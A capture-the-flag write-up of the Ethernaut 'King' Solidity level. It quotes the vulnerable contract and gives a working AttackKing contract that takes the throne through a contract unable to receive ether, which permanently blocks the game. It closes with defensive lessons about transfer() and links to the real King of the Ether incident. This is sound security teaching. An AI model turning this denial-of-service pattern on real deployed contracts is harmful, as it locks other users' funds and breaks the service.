# King

![https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg](https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg)

# Objectives

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

# Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

# Analysis

This challenge wants us to become the new King of this game in a way that the game fails afterwards and no one else can become the new king anymore. The real magic happening in the `receive()` function. Let’s take a look - 

```solidity
receive() external payable {
  require(msg.value >= prize || msg.sender == owner);
  payable(king).transfer(msg.value);
  king = msg.sender;
  prize = msg.value;
}
```

It’s an external fallback function which is `payable` and it does a requirement checks to see if the value we sent in this function is more than the current prize or the `msg.sender` is the current owner. Once the requirement passes, it will transfer the value to the previous king’s address and then it will set the new king and prize.

A quick check on the prize using `await contract.prize()` tells us that the current prize is `1000000000000000 wei` or `0.001 Ether` , so we have send at lease 0.001 Ether to be the new owner.

# AntiSec

To exploit this game, we need to make sure that once we become the new king, no other users can send Ether to our address any more and the `receive()` function in the `King` contract will always fail.
To achieve that all we have to do is call the send the `Ether` from an another contract which will do not have any `fallback` or `receive` function, so that it does not accept any sorts of Ethers using the `transfer()` method and will always revert the value back to the sender.

To write the Hack contract, I will use `RemixIDE`, and I will send `0.001` Ether to the `King`'s contract. We will write a constructor which will be payable, that allows us to send some Ether while deploying the contract. And it will automatically trigger the `receive()` function in the `King`'s contract. The `msg.value` is set to `prize` which we are dynamically fetching from the victim contract.

Since we did not implemented any `receive()` or `fallback()` function, no one else can send Ether to our `AttackKing` contract using a normal `transfer()` call. We can implement a `receive()` or `fallback()` function with a `revert` statement, however it does the same thing, hence I left it out of the code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address payable _victim) payable {
        uint prize = King(_victim).prize();
        (bool ok, ) = _victim.call{value: prize}("");
        require(ok, "failed");
    }
}

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

# Key Takeaways

External calls should be used with caution and proper error handling should be implemented on all external calls. Wrong use of methods can exploit an entire contract and it’s balances.

Also use `transfer()` method with caution, don’t use it if you are not sure these are account addresses, and if you want to run logics after using this method. It is better to use `call()` because that allows us to check if a transfer was successful or not.

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
